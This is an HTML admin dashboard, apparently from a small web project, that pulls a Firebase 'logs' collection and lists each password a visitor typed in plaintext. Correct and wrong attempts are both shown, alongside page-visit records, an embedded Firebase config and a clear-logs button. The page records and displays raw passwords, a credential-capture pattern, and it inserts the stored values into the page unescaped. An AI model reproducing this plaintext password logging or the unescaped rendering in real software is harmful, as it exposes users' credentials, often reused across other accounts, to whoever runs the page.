<!DOCTYPE html>
<html>
<head>
<title>Admin Logs</title>

<style>
body {
  background: #0a0a0a;
  color: #00ffcc;
  font-family: monospace;
  padding: 20px;
}

/* TITLE */
h1 {
  text-align: center;
  margin-bottom: 20px;
}

/* TABLE */
table {
  width: 100%;
  border-collapse: collapse;
  background: #111;
  box-shadow: 0 0 10px #00ffcc33;
}

th, td {
  border: 1px solid #00ffcc33;
  padding: 10px;
  text-align: center;
}

th {
  background: #002b2b;
  color: #00ffcc;
}

tr:nth-child(even) {
  background: #0f1f1f;
}

tr:hover {
  background: #003333;
}

/* BUTTON */
.clear-btn {
  margin-top: 15px;
  padding: 8px 15px;
  background: red;
  border: none;
  color: white;
  cursor: pointer;
}

.clear-btn:hover {
  background: darkred;
}
</style>

</head>

<body>

<h1>🛠️ LOGIN LOGS</h1>

<table>
  <thead>
    <tr>
      <th>#</th>
      <th>Password Entered</th>
      <th>Time</th>
    </tr>
  </thead>
  <tbody id="logTable"></tbody>
</table>

<button class="clear-btn" onclick="clearLogs()">Clear Logs</button>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getFirestore, collection, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDbacglQqfeYrzeOxKHx54TN-rCGySmfU8",
  authDomain: "logger-e079d.firebaseapp.com",
  projectId: "logger-e079d",
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let table = document.getElementById("logTable");

// 🔥 LOAD LOGS FROM FIREBASE
async function loadLogs() {
  const querySnapshot = await getDocs(collection(db, "logs"));

  if (querySnapshot.empty) {
    table.innerHTML = "<tr><td colspan='3'>No logs yet</td></tr>";
    return;
  }

  let index = 1;

  querySnapshot.forEach((docSnap) => {
    const data = docSnap.data();

  let value = "";

   if (data.type === "Login") {
    value = data.status === "Correct"
    ? "🟢 " + data.password
    : "🔴 " + data.password;
} else if (data.type === "Page Visit") {
  value = "👁️ Page Visit";
} else {
  value = "N/A";
}

let row = `
<tr>
  <td>${index++}</td>
  <td>${value}</td>
  <td>${data.time}</td>
</tr>
`;

    table.innerHTML += row;
  });
}

loadLogs();


// 🧹 CLEAR LOGS (DELETE FROM FIREBASE)
async function clearLogs() {
  if (confirm("Clear all logs?")) {
    const querySnapshot = await getDocs(collection(db, "logs"));

    const promises = [];
    querySnapshot.forEach((docSnap) => {
      promises.push(deleteDoc(doc(db, "logs", docSnap.id)));
    });

    await Promise.all(promises);

    location.reload();
  }
}

window.clearLogs = clearLogs;
</script>

</body>
</html>
